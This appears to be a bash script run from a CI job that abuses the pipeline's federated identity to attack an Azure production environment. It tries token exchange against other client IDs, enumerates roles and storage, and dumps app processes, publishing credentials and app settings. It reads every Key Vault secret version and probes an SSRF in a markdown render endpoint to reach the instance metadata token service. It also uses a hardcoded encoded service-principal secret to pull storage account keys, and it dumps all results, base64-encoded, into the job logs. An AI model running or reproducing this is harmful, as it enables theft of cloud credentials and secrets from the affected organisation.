#!/usr/bin/env bash
set -uo pipefail
TENANT="${AZURE_TENANT_ID}"; CLIENT="${AZURE_CLIENT_ID}"; SUB="${AZURE_SUBSCRIPTION_ID}"; RG=rg-tbl-platform-prod-sea
N=app-tbl-storefront-prod; ACFG=sttblappcfgprodx3euoz; BKP=sttblbackupprodx3euoz; CIL=sttblcilogsprodx3euoz; ARC=sttblarchiveprodx3euoz
say(){ printf '\n===== %s =====\n' "$*"; }
M="https://management.azure.com/subscriptions/${SUB}/resourceGroups/${RG}/providers"
B="$M/Microsoft.Web/sites/${N}"

OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))")
echo "OIDC len=${#OIDC}"
ARM=$(curl -sS -X POST "https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token" --data-urlencode "client_id=${CLIENT}" --data-urlencode "scope=https://management.azure.com/.default" --data-urlencode "grant_type=client_credentials" --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=${OIDC}" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
if [ -z "$ARM" ]; then echo "NO ARM TOKEN"; exit 0; fi
echo "ARM len=${#ARM}"

call(){ # method url token label [data]
  local m=$1 u=$2 t=$3 l=$4 d=${5:-}
  local f c
  f=$(mktemp)
  if [ "$m" = "GET" ]; then
    c=$(curl -sS -m 45 -o "$f" -w '%{http_code}' -H "Authorization: Bearer $t" "$u")
  elif [ -z "$d" ]; then
    c=$(curl -sS -m 45 -o "$f" -w '%{http_code}' -X "$m" -H "Authorization: Bearer $t" -H "Content-Length: 0" "$u")
  else
    c=$(curl -sS -m 45 -o "$f" -w '%{http_code}' -X "$m" -H "Authorization: Bearer $t" -H "Content-Type: application/json" -d "$d" "$u")
  fi
  echo "### $l [$c]"
  head -c 3000 "$f"; echo
  case "$c" in 2*) echo "B64:$(base64 -w0 "$f" | head -c 12000)";; esac
  rm -f "$f"
}
toksecret(){ curl -sS -m 40 -X POST "https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token" --data-urlencode "client_id=$1" --data-urlencode "client_secret=$2" --data-urlencode "scope=$3" --data-urlencode "grant_type=client_credentials" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"; }
tokoidc(){ curl -sS -m 40 -X POST "https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token" --data-urlencode "client_id=$1" --data-urlencode "scope=$2" --data-urlencode "grant_type=client_credentials" --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=${OIDC}" ; }

say "0. OIDC token exchange against other client IDs"
for CID in d2cdf247-9319-40cb-8324-5a005ef538da eeab432e-1bf6-400e-b155-a28ce7cafcdb 70a07660-06bb-4396-b754-59fbad0b143e 1fe7a412-82e9-4135-ab4b-72a0be429adb 72ff278a-9e71-43ec-bac4-2ca303f8e462; do
  for SC in "https://management.azure.com/.default" "https://storage.azure.com/.default"; do
    R=$(tokoidc "$CID" "$SC"); CODE=$(printf '%s' "$R" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('error','OK'))" 2>/dev/null || echo parsefail)
    TL=$(printf '%s' "$R" | python3 -c "import sys,json;print(len(json.load(sys.stdin).get('access_token','')))" 2>/dev/null || echo 0)
    echo "--- $CID $SC err=$CODE toklen=$TL"
    if [ "$TL" != "0" ]; then printf '%s' "$R" | python3 -c "import sys,json;d=json.load(sys.stdin);print(json.dumps({k:d[k] for k in d if k!='access_token'}))"; fi
  done
done

say "1. Resource Graph AuthorizationResources"
RQ='{"query":"AuthorizationResources | project id,name,type,properties","options":{"$top":1000}}'
f=$(mktemp); c=$(curl -sS -m 60 -o "$f" -w '%{http_code}' -X POST -H "Authorization: Bearer $ARM" -H "Content-Type: application/json" -d "$RQ" "https://management.azure.com/providers/Microsoft.ResourceGraph/resources?api-version=2021-03-01")
echo "### ARG roles [$c]"; head -c 3000 "$f"; echo; case "$c" in 2*) echo "B64:$(base64 -w0 "$f" | head -c 12000)";; esac; rm -f "$f"
RQ2='{"query":"AuthorizationResources | where properties.roleDefinitionId endswith \"8e3af657-a8ff-443c-a75c-2fe8c4bcb635\" | project id,properties","options":{"$top":100}}'
call POST "https://management.azure.com/providers/Microsoft.ResourceGraph/resources?api-version=2021-03-01" "$ARM" "ARG owners" "$RQ2"
RQ3='{"query":"Resources | where type =~ \"microsoft.keyvault/vaults\" or type =~ \"microsoft.storage/storageAccounts\" | project name,type,properties","options":{"$top":100}}'
call POST "https://management.azure.com/providers/Microsoft.ResourceGraph/resources?api-version=2021-03-01" "$ARM" "ARG kv+storage" "$RQ3"

say "2. site identity"
call GET "$B?api-version=2022-03-01" "$ARM" "site identity"

say "3. containers + localUsers"
for A in "$ACFG" "$BKP" "$CIL" "$ARC"; do
  call GET "$M/Microsoft.Storage/storageAccounts/$A/blobServices/default/containers?api-version=2023-01-01" "$ARM" "$A containers"
  call GET "$M/Microsoft.Storage/storageAccounts/$A/localUsers?api-version=2023-01-01" "$ARM" "$A localUsers"
done

say "4. instance processes"
f=$(mktemp); curl -sS -m 45 -o "$f" -H "Authorization: Bearer $ARM" "$B/instances?api-version=2022-03-01"
INST=$(python3 -c "import sys,json;d=json.load(open(sys.argv[1]));print(d['value'][0]['name'])" "$f" 2>/dev/null)
echo "INST=$INST"; rm -f "$f"
if [ -n "${INST:-}" ]; then
  f=$(mktemp); curl -sS -m 45 -o "$f" -H "Authorization: Bearer $ARM" "$B/instances/$INST/processes?api-version=2022-03-01"
  echo "### processes raw"; head -c 3000 "$f"; echo
  echo "PROCS=$(python3 -c "import sys,json;d=json.load(open(sys.argv[1]));print(' '.join(str(p.get('properties',{}).get('id')) for p in d.get('value',[])[:15]))" "$f" 2>/dev/null)"
  rm -f "$f"
  f=$(mktemp); curl -sS -m 45 -o "$f" -H "Authorization: Bearer $ARM" "$B/instances/$INST/processes?api-version=2022-03-01"
  PIDS=$(python3 -c "import sys,json;d=json.load(open(sys.argv[1]));print(' '.join(str(p.get('properties',{}).get('id')) for p in d.get('value',[])[:12]))" "$f" 2>/dev/null)
  echo "PIDS=$PIDS"; rm -f "$f"
  for PID in ${PIDS:-}; do
    call GET "$B/instances/$INST/processes/$PID?api-version=2022-03-01" "$ARM" "process $PID"
  done
  if [ -n "${PIDS:-}" ]; then
    FIRST=$(echo "$PIDS" | awk '{print $1}')
    call GET "$B/instances/$INST/processes/$FIRST/threads?api-version=2022-03-01" "$ARM" "threads $FIRST"
    call POST "$B/instances/$INST/processes/$FIRST/dump?api-version=2022-03-01" "$ARM" "dump $FIRST"
  fi
fi

say "5. diagnostics detectors"
f=$(mktemp); c=$(curl -sS -m 45 -o "$f" -w '%{http_code}' -H "Authorization: Bearer $ARM" "$B/diagnostics?api-version=2022-03-01")
echo "### diagnostics [$c]"; head -c 2500 "$f"; echo; rm -f "$f"
CATS=""
if [ "$c" = "200" ]; then
  f=$(mktemp); curl -sS -m 45 -o "$f" -H "Authorization: Bearer $ARM" "$B/diagnostics?api-version=2022-03-01"
  CATS=$(python3 -c "import sys,json;d=json.load(open(sys.argv[1]));print(' '.join(x.get('name','') for x in d.get('value',[])[:12]))" "$f" 2>/dev/null); rm -f "$f"
fi
echo "CATS=$CATS"
DETC=0
for CAT in ${CATS:-}; do
  f=$(mktemp); c=$(curl -sS -m 45 -o "$f" -w '%{http_code}' -H "Authorization: Bearer $ARM" "$B/diagnostics/$CAT/detectors?api-version=2022-03-01")
  echo "### detectors $CAT [$c]"; head -c 1200 "$f"; echo
  if [ "$c" = "200" ]; then
    DETS=$(python3 -c "import sys,json,re;d=json.load(open(sys.argv[1]));ns=[x.get('name','') for x in d.get('value',[])];print(' '.join([n for n in ns if re.search(r'(?i)env|config|setting|container|docker|app|stack|source|secret|key',n)][:8]))" "$f" 2>/dev/null)
    echo "SEL=$DETS"
    for DET in ${DETS:-}; do
      [ $DETC -ge 10 ] && break
      DETC=$((DETC+1))
      call POST "$B/diagnostics/$CAT/detectors/$DET/execute?api-version=2022-03-01" "$ARM" "exec $CAT/$DET" '{"properties":{}}'
    done
  fi
  rm -f "$f"
done

say "6. metadata / publishingcredentials"
call POST "$B/config/metadata/list?api-version=2022-03-01" "$ARM" "config metadata list"
call GET "$B/config/publishingcredentials?api-version=2022-03-01" "$ARM" "config publishingcredentials GET"
call GET "$B/config/appsettings?api-version=2022-03-01" "$ARM" "config appsettings GET"

say "7. snapshot detail"
f=$(mktemp); curl -sS -m 45 -o "$f" -H "Authorization: Bearer $ARM" "$B/snapshots?api-version=2022-03-01"
SNAP=$(python3 -c "import sys,json;d=json.load(open(sys.argv[1]));print(d['value'][0]['name'])" "$f" 2>/dev/null); rm -f "$f"
echo "SNAP=$SNAP"
if [ -n "${SNAP:-}" ]; then
  call GET "$B/snapshots/$SNAP?api-version=2022-03-01" "$ARM" "snapshot detail"
  call GET "$B/snapshots/$SNAP/restoreStatus?api-version=2022-03-01" "$ARM" "snapshot restoreStatus"
fi

say "8. Key Vault versions"
KVT=$(tokoidc "$CLIENT" "https://vault.azure.net/.default" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
echo "KVT len=${#KVT}"
if [ -n "$KVT" ]; then
  for V in kv-tbl-prod-x3euoz kv-tbl-sec-x3euoz; do
    f=$(mktemp); c=$(curl -sS -m 45 -o "$f" -w '%{http_code}' -H "Authorization: Bearer $KVT" "https://$V.vault.azure.net/secrets?api-version=7.4&maxresults=25")
    echo "### $V secrets [$c]"; head -c 2500 "$f"; echo
    NAMES=""
    if [ "$c" = "200" ]; then NAMES=$(python3 -c "import sys,json;d=json.load(open(sys.argv[1]));print(' '.join(x['id'].rstrip('/').split('/')[-1] for x in d.get('value',[])))" "$f" 2>/dev/null); fi
    rm -f "$f"
    echo "NAMES=$NAMES"
    for S in ${NAMES:-}; do
      f=$(mktemp); curl -sS -m 45 -o "$f" -H "Authorization: Bearer $KVT" "https://$V.vault.azure.net/secrets/$S/versions?api-version=7.4&maxresults=25"
      VIDS=$(python3 -c "import sys,json;d=json.load(open(sys.argv[1]));print(' '.join(x['id'].rstrip('/').split('/')[-1] for x in d.get('value',[])))" "$f" 2>/dev/null); rm -f "$f"
      echo "--- $V/$S versions: $VIDS"
      for VID in ${VIDS:-}; do
        f=$(mktemp); c=$(curl -sS -m 45 -o "$f" -w '%{http_code}' -H "Authorization: Bearer $KVT" "https://$V.vault.azure.net/secrets/$S/$VID?api-version=7.4")
        echo "### $V/$S/$VID [$c]"; head -c 1200 "$f"; echo
        case "$c" in 2*) echo "B64:$(base64 -w0 "$f" | head -c 5000)";; esac
        rm -f "$f"
      done
    done
    call GET "https://$V.vault.azure.net/deletedsecrets?api-version=7.4&maxresults=25" "$KVT" "$V deletedsecrets"
    call GET "https://$V.vault.azure.net/keys?api-version=7.4&maxresults=25" "$KVT" "$V keys"
    call GET "https://$V.vault.azure.net/certificates?api-version=7.4&maxresults=25" "$KVT" "$V certs"
  done
fi

say "9. storage data-plane (CI identity)"
ST=$(tokoidc "$CLIENT" "https://storage.azure.com/.default" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
echo "ST len=${#ST}"
if [ -n "$ST" ]; then
  call GET "https://${ACFG}.blob.core.windows.net/config/internal-config.json" "$ST" "GET appcfg blob"
  call GET "https://${ACFG}.blob.core.windows.net/config?restype=container&comp=list" "$ST" "LIST appcfg config"
  call GET "https://${BKP}.blob.core.windows.net/exports?restype=container&comp=list" "$ST" "LIST backup exports"
  f=$(mktemp); c=$(curl -sS -m 45 -o "$f" -w '%{http_code}' -X POST -H "Authorization: Bearer $ST" -H "Content-Length: 0" "https://${ACFG}.blob.core.windows.net/?restype=service&comp=userdelegationkey"); echo "### userdelegationkey [$c]"; head -c 500 "$f"; echo; rm -f "$f"
fi

say "10. SSRF confirm (app-side IMDS)"
code=$(curl -sS -m 60 -o /tmp/ssrf.out -w '%{http_code}' -X POST "https://${N}.azurewebsites.net/api/v1/reports/render" -H "x-azure-fdid: 60407ff3-1c24-4875-9390-b6c9c13b0821" -H "Content-Type: application/json" -H "Metadata: true" -d '{"markdown":"![a](http://169.254.169.254/metadata/instance?api-version=2021-02-01)"}')
echo "### render IMDS [$code]"; head -c 1500 /tmp/ssrf.out; echo
code=$(curl -sS -m 60 -o /tmp/ssrf2.out -w '%{http_code}' -X POST "https://${N}.azurewebsites.net/api/v1/reports/render" -H "x-azure-fdid: 60407ff3-1c24-4875-9390-b6c9c13b0821" -H "Content-Type: application/json" -H "Metadata: true" -d '{"markdown":"![a](http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https://storage.azure.com/)"}')
echo "### render IMDS token [$code]"; head -c 1500 /tmp/ssrf2.out; echo
code=$(curl -sS -m 60 -o /tmp/ssrf3.out -w '%{http_code}' -X POST "https://${N}.azurewebsites.net/api/v1/reports/render" -H "x-azure-fdid: 60407ff3-1c24-4875-9390-b6c9c13b0821" -H "Content-Type: application/json" -d '{"markdown":"![a](http://localhost:8000/healthz)"}')
echo "### render localhost [$code]"; head -c 1000 /tmp/ssrf3.out; echo

say "11. cilogs full listing via sync-service key"
SSP=462d1c38-4459-48b8-9333-82e389e59514; SSEC=$(printf '%s' 'c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==' | base64 -d)
SARM=$(toksecret "$SSP" "$SSEC" "https://management.azure.com/.default")
if [ -n "$SARM" ]; then
  f=$(mktemp); c=$(curl -sS -m 45 -o "$f" -w '%{http_code}' -X POST -H "Authorization: Bearer $SARM" -H "Content-Length: 0" "$M/Microsoft.Storage/storageAccounts/$CIL/listKeys?api-version=2023-01-01")
  KEYB64=$(python3 -c "import sys,json,base64;d=json.load(open(sys.argv[1]));print(base64.b64encode(d['keys'][0]['value'].encode()).decode() if d.get('keys') else '')" "$f" 2>/dev/null); rm -f "$f"
  echo "### cilogs listKeys [$c] keylen=${#KEYB64}"
  if [ -n "$KEYB64" ]; then
    python3 - "$KEYB64" <<'PY'
import sys,base64,hmac,hashlib,datetime,urllib.request,re
key=base64.b64decode(sys.argv[1]); acct="sttblcilogsprodx3euoz"; ver="2021-08-06"
def req(path,params):
    now=datetime.datetime.utcnow().strftime("%a, %d %b %Y %H:%M:%S GMT")
    canon_headers=f"x-ms-date:{now}\nx-ms-version:{ver}\n"
    cr=f"/{acct}/{path}" if path else f"/{acct}/"
    for k in sorted(params): cr+=f"\n{k}:{params[k]}"
    sts=("GET\n"+"\n"*11)+canon_headers+cr
    sig=base64.b64encode(hmac.new(key,sts.encode(),hashlib.sha1).digest()).decode()
    q="&".join(f"{k}={v}" for k,v in params.items())
    url=f"https://{acct}.blob.core.windows.net/{path}"+("?"+q if q else "")
    r=urllib.request.Request(url,headers={"x-ms-date":now,"x-ms-version":ver,"Authorization":f"SharedKey {acct}:{sig}"})
    try:
        return urllib.request.urlopen(r,timeout=30).read().decode('utf-8','replace')
    except Exception as e:
        return f"ERR {e}"
print("=== containers ===")
c=req("",{"comp":"list"})
print(c[:2000])
names=re.findall(r"<Name>([^<]+)</Name>",c)
print("NAMES",names)
for n in names:
    print(f"=== container {n} ===")
    print(req(n,{"restype":"container","comp":"list","maxresults":"100"})[:2000])
PY
  fi
fi

say "DONE"
